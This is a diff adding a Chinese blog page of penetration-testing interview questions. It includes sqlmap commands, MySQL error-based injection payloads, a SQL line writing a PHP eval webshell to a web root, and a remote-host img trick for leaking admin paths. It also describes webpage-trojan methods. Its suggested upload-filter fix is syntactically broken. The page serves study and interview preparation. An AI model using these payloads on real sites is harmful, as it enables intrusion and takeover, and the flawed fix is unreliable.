@@ -1,0 +1,1753 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="总是阴错阳差我喜欢你的时候你不喜欢，你喜欢我的时候我却又不喜欢。  首先祝贺青春牛牛成功面试，成为合天网安的一名渗透测试工程师，然后在这里就整理了一些面试的题目，当然也有网上收集的，有的不清楚来源，侵删。">
+<meta name="keywords" content="安全面试题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安全面试题整理">
+<meta property="og:url" content="https://lengjibo.github.io/安全面试题整理/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="总是阴错阳差我喜欢你的时候你不喜欢，你喜欢我的时候我却又不喜欢。  首先祝贺青春牛牛成功面试，成为合天网安的一名渗透测试工程师，然后在这里就整理了一些面试的题目，当然也有网上收集的，有的不清楚来源，侵删。">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://i1.hdslb.com/bfs/archive/298e7680e52c1a58dce6ddbedffab96635ef1532.jpg">
+<meta property="og:updated_time" content="2018-08-19T12:11:02.887Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="安全面试题整理">
+<meta name="twitter:description" content="总是阴错阳差我喜欢你的时候你不喜欢，你喜欢我的时候我却又不喜欢。  首先祝贺青春牛牛成功面试，成为合天网安的一名渗透测试工程师，然后在这里就整理了一些面试的题目，当然也有网上收集的，有的不清楚来源，侵删。">
+<meta name="twitter:image" content="http://i1.hdslb.com/bfs/archive/298e7680e52c1a58dce6ddbedffab96635ef1532.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/安全面试题整理/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>安全面试题整理 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/安全面试题整理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="https://i.screenshot.net/9zoe9ax">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">安全面试题整理
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-08-19 19:45:53 / Updated at: 20:11:02" itemprop="dateCreated datePublished" datetime="2018-08-19T19:45:53+08:00">2018-08-19</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>总是阴错阳差我喜欢你的时候你不喜欢，<br>你喜欢我的时候我却又不喜欢。</p>
+<hr>
+<p>首先祝贺青春牛牛成功面试，成为合天网安的一名渗透测试工程师，然后在这里就<br>整理了一些面试的题目，当然也有网上收集的，有的不清楚来源，侵删。</p>
+<a id="more"></a>
+<h1 id="渗透测试安全面试题（1）"><a href="#渗透测试安全面试题（1）" class="headerlink" title="渗透测试安全面试题（1）"></a>渗透测试安全面试题（1）</h1><h3 id="1，做一下简单的自我介绍，经历，工作经验，爱好，自己总结。"><a href="#1，做一下简单的自我介绍，经历，工作经验，爱好，自己总结。" class="headerlink" title="1，做一下简单的自我介绍，经历，工作经验，爱好，自己总结。"></a>1，做一下简单的自我介绍，经历，工作经验，爱好，自己总结。</h3><p>面试题：</p>
+<h3 id="一，给你一个网站你是如何来渗透测试的"><a href="#一，给你一个网站你是如何来渗透测试的" class="headerlink" title="一，给你一个网站你是如何来渗透测试的?"></a>一，给你一个网站你是如何来渗透测试的?</h3><pre><code>在获取书面授权的前提下。
+1)信息收集，
+        1，获取域名的whois信息,获取注册者邮箱姓名电话等。
+        2，查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。
+        3，查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞
+        4，查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。
+        5，扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针
+        6，google hack 进一步探测网站的信息，后台，敏感文件
+2）漏洞扫描
+        开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，
+        远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等
+3）漏洞利用
+        利用以上的方式拿到webshell，或者其他权限
+4）权限提升
+        提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，
+                linux藏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权
+5) 日志清理
+6）总结报告及修复方案
+</code></pre><h3 id="一，sqlmap，怎么对一个注入点注入？"><a href="#一，sqlmap，怎么对一个注入点注入？" class="headerlink" title="一，sqlmap，怎么对一个注入点注入？"></a>一，sqlmap，怎么对一个注入点注入？</h3><pre><code>1）如果是get型号，直接，sqlmap -u &quot;诸如点网址&quot;.
+2) 如果是post型诸如点，可以sqlmap -u &quot;注入点网址” --data=&quot;post的参数&quot;
+3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用*号替换，放到文件里，然后sqlmap -r &quot;文件地址&quot;
+</code></pre><h3 id="二，nmap，扫描的几种方式"><a href="#二，nmap，扫描的几种方式" class="headerlink" title="二，nmap，扫描的几种方式"></a>二，nmap，扫描的几种方式</h3><h3 id="三，sql注入的几种类型？"><a href="#三，sql注入的几种类型？" class="headerlink" title="三，sql注入的几种类型？"></a>三，sql注入的几种类型？</h3><pre><code>1）报错注入
+2）bool型注入
+3）延时注入
+4）宽字节注入
+</code></pre><h3 id="四，报错注入的函数有哪些？-10个"><a href="#四，报错注入的函数有哪些？-10个" class="headerlink" title="四，报错注入的函数有哪些？ 10个"></a>四，报错注入的函数有哪些？ 10个</h3><pre><code>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】----------------
+2）通过floor报错 向下取整
+3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)
+4）.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+5）.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+6）.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+7）.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+8）.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+9）.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+10）.exp()select * from test where id=1 and exp(~(select * from(select user())a));
+</code></pre><h3 id="五，延时注入如何来判断？"><a href="#五，延时注入如何来判断？" class="headerlink" title="五，延时注入如何来判断？"></a>五，延时注入如何来判断？</h3><pre><code>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)
+</code></pre><h3 id="六，盲注和延时注入的共同点？"><a href="#六，盲注和延时注入的共同点？" class="headerlink" title="六，盲注和延时注入的共同点？"></a>六，盲注和延时注入的共同点？</h3><pre><code>都是一个字符一个字符的判断
+</code></pre><h3 id="七，如何拿一个网站的webshell？"><a href="#七，如何拿一个网站的webshell？" class="headerlink" title="七，如何拿一个网站的webshell？"></a>七，如何拿一个网站的webshell？</h3><pre><code>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，
+一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等
+</code></pre><h3 id="八，sql注入写文件都有哪些函数？"><a href="#八，sql注入写文件都有哪些函数？" class="headerlink" title="八，sql注入写文件都有哪些函数？"></a>八，sql注入写文件都有哪些函数？</h3><pre><code>select &apos;一句话&apos; into outfile &apos;路径&apos;
+select &apos;一句话&apos; into dumpfile &apos;路径&apos;
+select &apos;&lt;?php eval($_POST[1]) ?&gt;&apos; into dumpfile  &apos;d:\\wwwroot\baidu.com\nvhack.php&apos;;
+</code></pre><h3 id="九，如何防止CSRF"><a href="#九，如何防止CSRF" class="headerlink" title="九，如何防止CSRF?"></a>九，如何防止CSRF?</h3><pre><code>1,验证referer
+2，验证token
+详细：http://cnodejs.org/topic/5533dd6e9138f09b629674fd
+</code></pre><h3 id="十，owasp-漏洞都有哪些？"><a href="#十，owasp-漏洞都有哪些？" class="headerlink" title="十，owasp 漏洞都有哪些？"></a>十，owasp 漏洞都有哪些？</h3><pre><code>1、SQL注入防护方法：
+2、失效的身份认证和会话管理
+3、跨站脚本攻击XSS
+4、直接引用不安全的对象
+5、安全配置错误
+6、敏感信息泄露
+7、缺少功能级的访问控制
+8、跨站请求伪造CSRF
+9、使用含有已知漏洞的组件
+10、未验证的重定向和转发
+</code></pre><h3 id="十一：SQL注入防护方法？"><a href="#十一：SQL注入防护方法？" class="headerlink" title="十一：SQL注入防护方法？"></a>十一：SQL注入防护方法？</h3><pre><code>1、使用安全的API
+2、对输入的特殊字符进行Escape转义处理
+3、使用白名单来规范化输入验证方法
+4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符
+5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。
+</code></pre><h3 id="十二，代码执行，文件读取，命令执行的函数都有哪些？"><a href="#十二，代码执行，文件读取，命令执行的函数都有哪些？" class="headerlink" title="十二，代码执行，文件读取，命令执行的函数都有哪些？"></a>十二，代码执行，文件读取，命令执行的函数都有哪些？</h3><pre><code>1，代码执行：eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function
+2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等
+3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()
+</code></pre><h3 id="十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"><a href="#十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"></a>十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</h3><pre><code>src指定一个远程的脚本文件，获取referer
+</code></pre><h3 id="十四，img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。"><a href="#十四，img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。" class="headerlink" title="十四，img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。"></a>十四，img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</h3><pre><code>1,远程服务器修改apache配置文件，配置.jpg文件以php方式来解析
+AddType application/x-httpd-php .jpg
+&lt;img src=http://xss.tv/1.jpg&gt; 会以php方式来解析
+</code></pre><p>以上来自：<a href="http://nvhack.com/forum.php?mod=viewthread&amp;tid=190&amp;extra=page%3D1" target="_blank" rel="noopener">http://nvhack.com/forum.php?mod=viewthread&amp;tid=190&amp;extra=page%3D1</a></p>
+<h1 id="渗透测试安全面试题（2）"><a href="#渗透测试安全面试题（2）" class="headerlink" title="渗透测试安全面试题（2）"></a>渗透测试安全面试题（2）</h1><h3 id="1、网站入侵分析"><a href="#1、网站入侵分析" class="headerlink" title="1、网站入侵分析"></a>1、网站入侵分析</h3><p>eWEBEditor是一个在线的HTML编辑器，很多网站都集成这个编辑器，以方便发布信息。低版本的eWEBEditor在线HTML编辑器，存在着上传漏洞，黑客利用这点得到WEBSHELL(网页管理权限)后，修改了网站，进行了挂马操作。</p>
+<p>其原理是：eWEBEditor的默认管理员登录页面没有更改，而且默认的用户名和密码都没有更改。攻击者登陆eWEBEditor后，添加一种新的样式类型，然后设置上传文件的类型，比如加入asp文件类型，就可以上传一个网页木马了。(图8)</p>
+<h3 id="2、判断分析网页漏洞"><a href="#2、判断分析网页漏洞" class="headerlink" title="2、判断分析网页漏洞"></a>2、判断分析网页漏洞</h3><p>(1)攻击者判断网站是否采用了eWEBEditor的方法一般都是通过浏览网站查看相关的页面或者通过搜索引擎搜索类似”ewebeditor.asp?id=”语句，只要类似的语句存在，就能判断网站确实使用了WEB编辑器。</p>
+<p>(2)eWEBEditor编辑器可能被黑客利用的安全漏洞：<br>a.管理员未对数据库的路径和名称进行修改，导致黑客可以利用编辑器默认路径直接对网站数据库进行下载。  直接下载默认路径的数据库<br>b.管理员未对编辑器的后台管理路径进行修改导致黑客可以通过数据库获得的用户名和密码进行登陆或者直接输入默认的用户名和密码，直接进入编辑器的后台。<br>     从数据库中获得账号密码登进后台<br>c.该WEB编辑器上传程序存在安全漏洞。   可直接上传木马</p>
+<h3 id="四、网页木马的防御和清除"><a href="#四、网页木马的防御和清除" class="headerlink" title="四、网页木马的防御和清除"></a>四、网页木马的防御和清除</h3><p>1、防御网页木马，服务器设置非常重要，反注册、卸载危险组件：</p>
+<p>(网页后门木马调用的组件)<br>(1)卸载wscript.shell对象，在cmd先或者直接运行：<br>regsvr32 /u %windir%system32WSHom.Ocx  </p>
+<p>存在绕过，现在这里卸载了到时候攻击的时候再装上就可以了<br>(2)卸载FSO对象，在cmd下或者直接运行：<br>regsvr32.exe /u %windir%system32scrrun.dll<br>(3)卸载stream对象，在cmd下或者直接运行：<br>regsvr32.exe /u /s “C:Program FilesCommon FilesSystemadomsado15.dll”<br>注：如果想恢复的话只需重新注册即可，例如：regsvr32 %windir%system32WSHom.Ocx</p>
+<p>2、清理网页挂马<br>(1)利用雷客图ASP站长安全助手查找所有在2008-3.1日-2008.3.5日之间所有修改过的文件里是否有iframe语句和<a href="http://www.xxx.com/a.htm关键词，进行手工清理。" target="_blank" rel="noopener">http://www.xxx.com/a.htm关键词，进行手工清理。</a><br>(2)也可利用雷客图ASP站长安全助手批量删除网马。<br>(3)检测JS文件，在2008-3.1日-2008.3.5日之间增加的JS文件全部删除。(图9)</p>
+<p>从分析报告可以看到网站的admin路径下发现lb.asp网页木马，经分析为老兵的网页木马。(加密后依旧能通过特征码分辨，推荐网 站管理员使用雷客ASP站长安全助手，经常检测网站是否被非法修改。)</p>
+<p>提示：雷客图ASP站长安全助手可以帮助站长分析网站的安全状况，但是一定要更改它的默认用户名和密码。</p>
+<p>3、解决eWEBEditor编辑器安全隐患<br>由于网站在开发时集成了eWEBEditor编辑器，删除或者替换容易导致其他问题的出现，推荐按如下方案解决：<br>(1)修改该编辑器的默认数据库路径和数据库名，防止被黑客非法下载。<br>默认登录路径admin_login.asp<br>默认数据库db/ewebeditor.mdb<br>(2)修改编辑器后台登录路径和默认的登录用户名和密码，防止黑客进入管理界面。<br>默认帐号admin<br>默认密码admin或者admin888(图10)<br>(3)对Upload.asp语句进行修改，防止黑客利用其上传ASP木马从而获得WEB权限。<br>对上传语句现在进行修改：</p>
+<p>将原来的：sAllowExt=Replace(UCase(sAllowExt),”ASP”,””)</p>
+<p>修改为：sAllowExt=Replace(UCase(sAllowExt),”ASP”,””),”CER”,””),”ASA”,””),”CDX”,””),”HTR”,””)</p>
+<p>增加上传对cer、asa、cdx、htr文件类型的限制，因为这些类型的文件都是可以执行的文件，可以被攻击者利用进行对网站及其服务器进行危险操作的文件类型。</p>
+<h3 id="centos-iptables防火墙的基本命令解析"><a href="#centos-iptables防火墙的基本命令解析" class="headerlink" title="centos iptables防火墙的基本命令解析"></a>centos iptables防火墙的基本命令解析</h3><p>如果没有安装iptables需要先安装，CentOS执行：<br>yum install iptables Debian/Ubuntu</p>
+<p>执行：<br>apt-get install iptables</p>
+<p> 2、清除已有iptables规则</p>
+<p>iptables -F<br>iptables -X<br>iptables -Z</p>
+<p>3、开放指定的端口</p>
+<p>允许本地回环接口(即运行本机访问本机)<br>iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT<br> 允许已建立的或相关连的通行<br>iptables -A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT<br>允许所有本机向外的访问<br>iptables -A OUTPUT -j ACCEPT<br> 允许访问22端口<br>iptables -A INPUT -p tcp –dport 22 -j ACCEPT<br>允许访问80端口<br>iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>允许FTP服务的21和20端口<br>iptables -A INPUT -p tcp –dport 21 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 20 -j ACCEPT<br>如果有其他端口的话，规则也类似，稍微修改上述语句就行<br>禁止其他未允许的规则访问<br>iptables -A INPUT -j REJECT<br>iptables -A FORWARD -j REJECT</p>
+<p>4、屏蔽IP #如果只是想屏蔽IP的话“3、开放指定的端口”可以直接跳过。<br>屏蔽单个IP的命令是<br>iptables -I INPUT -s 123.45.6.7 -j DROP<br>封整个段即从123.0.0.1到123.255.255.254的命令<br>iptables -I INPUT -s 123.0.0.0/8 -j DROP<br>封IP段即从123.45.0.1到123.45.255.254的命令<br>iptables -I INPUT -s 124.45.0.0/16 -j DROP<br>封IP段即从123.45.6.1到123.45.6.254的命令是<br>iptables -I INPUT -s 123.45.6.0/24 -j DROP</p>
+<p>4、查看已添加的iptables规则 iptables -L -n<br>v：显示详细信息，包括每条规则的匹配包数量和匹配字节数<br>x：在 v 的基础上，禁止自动单位换算（K、M） vps侦探<br>n：只显示IP地址和端口号，不将ip解析为域名<br>5、删除已添加的iptables规则<br>将所有iptables以序号标记显示，执行：<br>iptables -L -n –line-numbers<br>比如要删除INPUT里序号为8的规则，执行：<br>iptables -D INPUT 8</p>
+<p>6、iptables的开机启动及规则保存<br>CentOS上可能会存在安装好iptables后，iptables并不开机自启动，可以执行一下：<br>chkconfig –level 345 iptables on<br>将其加入开机启动。<br>CentOS上可以执行：service iptables save保存规则。<br>另外更需要注意的是Debian/Ubuntu上iptables是不会保存规则的。<br>需要按如下步骤进行，让网卡关闭是保存iptables规则，启动时加载iptables规则：<br>创建/etc/network/if-post-down.d/iptables 文件，添加如下内容：<br>!/bin/bash<br>iptables-save &gt; /etc/iptables.rules<br>执行：chmod +x /etc/network/if-post-down.d/iptables 添加执行权限。<br>创建/etc/network/if-pre-up.d/iptables 文件，添加如下内容：<br>!/bin/bash<br>iptables-restore &lt; /etc/iptables.rules<br>执行：chmod +x /etc/network/if-pre-up.d/iptables 添加执行权限。<br>关于更多的iptables的使用方法可以执行：iptables –help或网上搜索一下iptables参数的说明。</p>
+<h3 id="什么是网页挂马-网页挂马都有什么类型"><a href="#什么是网页挂马-网页挂马都有什么类型" class="headerlink" title="什么是网页挂马?网页挂马都有什么类型?"></a>什么是网页挂马?网页挂马都有什么类型?</h3><p>网页挂马就是攻击者通过在正常的页面中(通常是网站的主页)插入一段代码。浏览者在打开该页面的时候，这段代码被执行，然后下载并运行某木马的服务器端程序，进而控制浏览者的主机。<br>（挂网马的目的，让访问该网页的主机下载某木马的服务器端程序，进而控制浏览者的主机。<br>）<br>网页挂马的类型<br>1、框架嵌入式网络挂马<br>网页木马被攻击者利用iframe语句，加载到任意网页中都可执行的挂马形式，是最早也是最有效的的一种网络挂马技术。通常的挂马代码如下：<br>解释：在打开插入该句代码的网页后，就也就打开了<a href="http://www.xxx.com/muma.html页面，但是由于它的长和宽都为“0”，所以很难察觉，非常具有隐蔽性。下面我们做过做个演示，比如在某网页中插入如下代码" target="_blank" rel="noopener">http://www.xxx.com/muma.html页面，但是由于它的长和宽都为“0”，所以很难察觉，非常具有隐蔽性。下面我们做过做个演示，比如在某网页中插入如下代码</a><br>在“百度”中嵌入了“IT168安全版块”的页面，效果如图1。(图1)<br>2、js调用型网页挂马<br>js挂马是一种利用js脚本文件调用的原理进行的网页木马隐蔽挂马技术，如：黑客先制作一个.js文件，然后利用js代码调用到挂马的网页。通常代码如下：<br><a href="http://www.xxx.com/gm.js就是一个js脚本文件，通过它调用和执行木马的服务端。这些js文件一般都可以通过工具生成，攻击者只需输入相关的选项就可以了，如图2就是一个JS木马的代码。(图2)" target="_blank" rel="noopener">http://www.xxx.com/gm.js就是一个js脚本文件，通过它调用和执行木马的服务端。这些js文件一般都可以通过工具生成，攻击者只需输入相关的选项就可以了，如图2就是一个JS木马的代码。(图2)</a><br>3、图片伪装挂马<br>随着防毒技术的发展，黑手段也不停地更新，图片木马技术逃避杀毒监视的新技术，攻击者将类似： <a href="http://www.xxx.com/test.htm中的木马代码植入到test.gif图片文件中，这些嵌入代码的图片都可以用工具生成，攻击者只" target="_blank" rel="noopener">http://www.xxx.com/test.htm中的木马代码植入到test.gif图片文件中，这些嵌入代码的图片都可以用工具生成，攻击者只</a> 需输入相关的选项就可以了，如图3。图片木马生成后，再利用代码调用执行，是比较新颖的一种挂马隐蔽方法，实例代码如：<br>注：当用户打开<a href="http://www.xxx.com/test.htm是，显示给用户的是http://www.xxx.com/test.jpg，而http://www.xxx.com/test.htm网页代码也随之运行。(图3)" target="_blank" rel="noopener">http://www.xxx.com/test.htm是，显示给用户的是http://www.xxx.com/test.jpg，而http://www.xxx.com/test.htm网页代码也随之运行。(图3)</a></p>
+<p>4、网络钓鱼挂马(也称为伪装调用挂马)<br>网络中最常见的欺骗手段，黑客们利用人们的猎奇、贪心等心理伪装构造一个链接或者一个网页，利用社会工程学欺骗方法，引诱点击，当用户打开一个 看似正常的页面时，网页代码随之运行，隐蔽性极高。这种方式往往和欺骗用户输入某些个人隐私信息，然后窃取个人隐私相关联。比如攻击者模仿腾讯公司设计了 一个获取QQ币的页面，引诱输入QQ好和密码，如图4。(图4)<br>等用户输入完提交后，就把这些信息发送到攻击者指定的地方，如图5。(图5)</p>
+<p>5、伪装挂马<br>高级欺骗，黑客利用IE或者Fixfox浏览器的设计缺陷制造的一种高级欺骗技术，当用户访问木马页面时地址栏显示<a href="http://www.sina.com或者security.ctocio.com.cn等用户信任地址，其实却打开了被挂马的页面，从而实现欺骗，示例代码如：" target="_blank" rel="noopener">www.sina.com或者security.ctocio.com.cn等用户信任地址，其实却打开了被挂马的页面，从而实现欺骗，示例代码如：</a><br>上面的代码的效果，在貌似<a href="http://safe.it168.com的链接如图6上点击却打开了http://www.hacker.com.cn，如图7。(图6)(图7)" target="_blank" rel="noopener">http://safe.it168.com的链接如图6上点击却打开了http://www.hacker.com.cn，如图7。(图6)(图7)</a><br>总结：上述的挂马方式都是利用了系统的漏洞，并且挂马的代码不用攻击者编写，都是实现了工具化、傻瓜化。技术门槛比较低，因此危害也特别大。</p>
+<h3 id="恶意软件的定义"><a href="#恶意软件的定义" class="headerlink" title="恶意软件的定义"></a>恶意软件的定义</h3><p>恶意软件-Malicious Software,malware<br>把未经授权便干扰或破坏计算机系统/网络功能的程序或代码（一组指令）称之为恶意程序。<br>一组指令：可能是二进制文件，也可能是脚本语言/宏语言等。</p>
+<p>介绍一下如何利用路径遍历进行攻击及如何防范?</p>
